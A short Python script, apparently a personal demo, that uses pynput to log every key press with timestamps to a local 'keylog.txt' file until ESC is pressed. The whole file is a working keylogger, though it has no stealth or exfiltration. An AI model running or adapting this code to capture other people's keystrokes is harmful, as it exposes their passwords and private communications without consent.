# Javier Ferrándiz Fernández - 05/12/2024 - https://github.com/javisys
from pynput import keyboard
import logging
from datetime import datetime

# Configure the log file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        # Log alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop the listener if ESC key is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
